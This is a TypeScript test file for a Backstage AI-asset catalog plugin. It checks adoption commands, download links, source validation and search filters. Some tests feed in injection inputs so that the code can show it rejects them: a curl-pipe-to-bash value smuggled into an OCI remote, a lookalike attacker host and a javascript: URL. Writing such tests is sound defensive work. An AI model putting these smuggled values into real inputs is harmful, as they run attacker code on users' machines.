/*
 * Copyright Red Hat, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import type { Entity } from '@backstage/catalog-model';

import type { FilterDefinition } from '../blueprints/AiCatalogFilterBlueprint';
import {
  applyEntityFilters,
  entityRefHref,
  getAdoptionAction,
  getAssetLocations,
} from './entityHelpers';

function entity(overrides: {
  name?: string;
  specType?: string;
  annotations?: Record<string, string>;
  location?: { type?: string; target?: string };
  remotes?: Array<{ url?: string; type?: string }>;
}): Entity {
  return {
    apiVersion: 'backstage.io/v1alpha1',
    kind: 'AiResource',
    metadata: {
      name: overrides.name ?? 'test-entity',
      namespace: 'default',
      annotations: overrides.annotations,
    },
    spec: {
      type: overrides.specType,
      lifecycle: 'production',
      owner: 'team-test',
      location: overrides.location,
      remotes: overrides.remotes,
    },
  } as Entity;
}

describe('entityRefHref', () => {
  it('builds a group catalog URL from a bare owner name', () => {
    expect(entityRefHref('team-ai-platform')).toBe(
      '/catalog/default/group/team-ai-platform',
    );
  });

  it('parses a fully-qualified group ref', () => {
    expect(entityRefHref('group:other-ns/platform')).toBe(
      '/catalog/other-ns/group/platform',
    );
  });

  it('parses a fully-qualified user ref', () => {
    expect(entityRefHref('user:default/jdoe')).toBe(
      '/catalog/default/user/jdoe',
    );
  });

  it('returns undefined for an unparseable ref', () => {
    expect(entityRefHref('group:')).toBeUndefined();
  });
});

describe('getAdoptionAction', () => {
  it('returns npx copy command for skill entities', () => {
    const action = getAdoptionAction(
      entity({ name: 'my-skill', specType: 'skill' }),
    );
    expect(action).toEqual({
      type: 'copy-command',
      commands: [{ value: 'npx skills add my-skill' }],
    });
  });

  it('returns Docker and Podman commands without the oci:// prefix', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-tool',
        remotes: [
          { url: 'https://not-oci.example.com', type: 'other' },
          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-command',
      commands: [
        {
          runtime: 'docker',
          value: 'docker pull registry.example.com/models/foo:latest',
        },
        {
          runtime: 'podman',
          value: 'podman pull registry.example.com/models/foo:latest',
        },
      ],
    });
  });

  it('falls through to git-sourced action when the ai-asset-source annotation is oci but no oci:// remote exists (finding #1 regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-tool',
        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
        location: {
          type: 'git',
          target: 'https://github.com/example/some-model',
        },
      }),
    );
    expect(action).toEqual({
      type: 'verified-download',
      href: 'https://api.github.com/repos/example/some-model/zipball',
    });
  });

  it('falls through to MCP-remote action when the ai-asset-source annotation is oci but no oci:// remote exists', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
        remotes: [
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-url',
      value: 'https://mcp.example.com/server',
    });
  });

  it('resolves a branch-agnostic GitHub zipball URL for github.com targets', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://github.com/example/some-rule',
        },
      }),
    );
    expect(action).toEqual({
      type: 'verified-download',
      href: 'https://api.github.com/repos/example/some-rule/zipball',
    });
  });

  it('uses View Source for a GitLab repository root without an archive', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://gitlab.com/example/some-rule',
        },
      }),
    );
    expect(action).toEqual({
      type: 'view-source',
      href: 'https://gitlab.com/example/some-rule',
    });
  });

  it('does not treat a spoofed lookalike host as a verified download', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://evil.github.com.attacker.com/example/some-rule',
        },
      }),
    );
    expect(action).toEqual({
      type: 'view-source',
      href: 'https://evil.github.com.attacker.com/example/some-rule',
    });
  });

  it('does not treat a malformed URL as a git host', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: { type: 'git', target: 'not-a-valid-url' },
      }),
    );
    expect(action).toBeUndefined();
  });

  it('selects the remote explicitly typed streamable-http over an earlier non-matching remote (finding #6 regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [
          { url: 'https://docs.example.com/mcp-server', type: 'docs' },
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-url',
      value: 'https://mcp.example.com/server',
    });
  });

  it('falls back to the first remote with a url when no remote is typed streamable-http', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [{ url: 'https://mcp.example.com/server', type: 'other' }],
      }),
    );
    expect(action).toEqual({
      type: 'copy-url',
      value: 'https://mcp.example.com/server',
    });
  });

  it('matches specType case-insensitively (e.g. Skill)', () => {
    const action = getAdoptionAction(
      entity({ name: 'my-skill', specType: 'Skill' }),
    );
    expect(action).toEqual({
      type: 'copy-command',
      commands: [{ value: 'npx skills add my-skill' }],
    });
  });

  it('matches mcp-server specType case-insensitively', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'MCP-Server',
        remotes: [
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-url',
      value: 'https://mcp.example.com/server',
    });
  });

  it('does not resolve git-sourced action when location.type is not git', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'url',
          target: 'https://github.com/example/some-rule',
        },
      }),
    );
    expect(action).toBeUndefined();
  });

  it('returns undefined when no actionable metadata is present', () => {
    const action = getAdoptionAction(entity({ specType: 'ai-tool' }));
    expect(action).toBeUndefined();
  });

  it('rejects an oci:// remote containing shell metacharacters (clipboard injection regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-tool',
        remotes: [{ url: 'oci://evil; curl x | bash', type: 'oci' }],
      }),
    );
    expect(action).toBeUndefined();
  });

  it('skips an unsafe oci:// remote and resolves the next valid one', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-tool',
        remotes: [
          { url: 'oci://evil; curl x | bash', type: 'oci' },
          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-command',
      commands: [
        {
          runtime: 'docker',
          value: 'docker pull registry.example.com/models/foo:latest',
        },
        {
          runtime: 'podman',
          value: 'podman pull registry.example.com/models/foo:latest',
        },
      ],
    });
  });

  it('accepts an oci:// reference with a registry port and tag', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-tool',
        remotes: [
          {
            url: 'oci://registry.example.com:5000/models/foo:latest',
            type: 'oci',
          },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-command',
      commands: [
        {
          runtime: 'docker',
          value: 'docker pull registry.example.com:5000/models/foo:latest',
        },
        {
          runtime: 'podman',
          value: 'podman pull registry.example.com:5000/models/foo:latest',
        },
      ],
    });
  });

  it('does not guess a wrong owner/repo for a GitHub subpage URL (archive URL parsing regression)', () => {
    const target = 'https://github.com/example/repo/tree/main';
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: { type: 'git', target },
      }),
    );
    expect(action).toEqual({ type: 'view-source', href: target });
  });

  it('rejects an MCP remote URL with a non-http(s) scheme', () => {
    const scriptUrl = ['java', 'script:alert(1)'].join('');
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [{ url: scriptUrl, type: 'streamable-http' }],
      }),
    );
    expect(action).toBeUndefined();
  });

  it('skips a non-http(s) MCP remote and resolves the next valid streamable-http one', () => {
    const scriptUrl = ['java', 'script:alert(1)'].join('');
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [
          { url: scriptUrl, type: 'other' },
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy-url',
      value: 'https://mcp.example.com/server',
    });
  });
});

describe('getAssetLocations', () => {
  it('returns validated Git and OCI sources without runtime endpoints', () => {
    const locations = getAssetLocations(
      entity({
        specType: 'mcp-server',
        annotations: {
          'backstage.io/source-location':
            'url:https://github.com/example/catalog-source',
        },
        location: {
          type: 'git',
          target: 'https://github.com/example/catalog-source',
        },
        remotes: [
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
          { url: 'oci://registry.example.com/assets/server:1', type: 'oci' },
        ],
      }),
    );

    expect(locations).toEqual([
      {
        type: 'git',
        value: 'https://github.com/example/catalog-source',
        href: 'https://github.com/example/catalog-source',
      },
      { type: 'oci', value: 'registry.example.com/assets/server:1' },
    ]);
  });

  it('rejects malformed sources and deduplicates OCI references', () => {
    const locations = getAssetLocations(
      entity({
        specType: 'ai-tool',
        location: { type: 'git', target: 'not-a-url' },
        remotes: [
          { url: 'oci://registry.example.com/assets/tool:1', type: 'oci' },
          { url: 'oci://registry.example.com/assets/tool:1', type: 'oci' },
          { url: 'oci://evil; curl x | bash', type: 'oci' },
        ],
      }),
    );

    expect(locations).toEqual([
      { type: 'oci', value: 'registry.example.com/assets/tool:1' },
    ]);
  });
});

const skill: Entity = {
  apiVersion: 'backstage.io/v1alpha1',
  kind: 'AiResource',
  metadata: {
    name: 'code-review',
    namespace: 'default',
    description: 'Automated code review skill',
    tags: ['security'],
  },
  spec: { type: 'skill', lifecycle: 'production', owner: 'team-ai' },
};

const agent: Entity = {
  apiVersion: 'backstage.io/v1alpha1',
  kind: 'AiResource',
  metadata: {
    name: 'dev-assistant',
    namespace: 'default',
    description: 'AI developer assistant',
    tags: ['agent'],
  },
  spec: { type: 'agent', lifecycle: 'experimental', owner: 'team-ml' },
};

const entities = [skill, agent];

const typeFilter: FilterDefinition = {
  urlParam: 'type',
  label: 'Type',
  getOptions: () => [],
  matchEntity: (e, vals) => {
    const t = (e.spec as Record<string, unknown>)?.type as string | undefined;
    return (
      t !== undefined && vals.some(v => v.toLowerCase() === t.toLowerCase())
    );
  },
  priority: 100,
};

const ownerFilter: FilterDefinition = {
  urlParam: 'owner',
  label: 'Owner',
  getOptions: () => [],
  matchEntity: (e, vals) => {
    const o = (e.spec as Record<string, unknown>)?.owner as string | undefined;
    return (
      o !== undefined && vals.some(v => v.toLowerCase() === o.toLowerCase())
    );
  },
  priority: 200,
};

describe('applyEntityFilters', () => {
  it('returns all entities when no search or filters active', () => {
    const result = applyEntityFilters(entities, undefined, [], new Map());
    expect(result).toHaveLength(2);
  });

  it('filters 500 visible entities within the 300ms expectation', () => {
    const largeCatalog = Array.from({ length: 500 }, (_, index) => ({
      ...skill,
      metadata: {
        ...skill.metadata,
        name: `skill-${index}`,
        description: index === 499 ? 'unique release proof' : 'common skill',
      },
    }));

    const started = performance.now();
    const result = applyEntityFilters(
      largeCatalog,
      'unique release proof',
      [],
      new Map(),
    );
    const elapsed = performance.now() - started;

    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('skill-499');
    expect(elapsed).toBeLessThan(300);
  });

  it('filters by search term in name', () => {
    const result = applyEntityFilters(entities, 'code-review', [], new Map());
    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('code-review');
  });

  it('filters by search term in description', () => {
    const result = applyEntityFilters(
      entities,
      'developer assistant',
      [],
      new Map(),
    );
    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('dev-assistant');
  });

  it('filters by search term in tags', () => {
    const result = applyEntityFilters(entities, 'security', [], new Map());
    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('code-review');
  });

  it('applies single filter via matchEntity', () => {
    const values = new Map([['type', ['skill']]]);
    const result = applyEntityFilters(
      entities,
      undefined,
      [typeFilter],
      values,
    );
    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('code-review');
  });

  it('applies multiple filters in AND logic', () => {
    const values = new Map([
      ['type', ['skill']],
      ['owner', ['team-ml']],
    ]);
    const result = applyEntityFilters(
      entities,
      undefined,
      [typeFilter, ownerFilter],
      values,
    );
    expect(result).toHaveLength(0);
  });

  it('combines search with filters in AND logic', () => {
    const values = new Map([['type', ['skill']]]);
    const result = applyEntityFilters(entities, 'code', [typeFilter], values);
    expect(result).toHaveLength(1);
    expect(result[0].metadata.name).toBe('code-review');
  });

  it('skips filters with no active values', () => {
    const values = new Map<string, string[]>();
    const result = applyEntityFilters(
      entities,
      undefined,
      [typeFilter, ownerFilter],
      values,
    );
    expect(result).toHaveLength(2);
  });

  it('search is case-insensitive', () => {
    const result = applyEntityFilters(entities, 'CODE-REVIEW', [], new Map());
    expect(result).toHaveLength(1);
  });
});
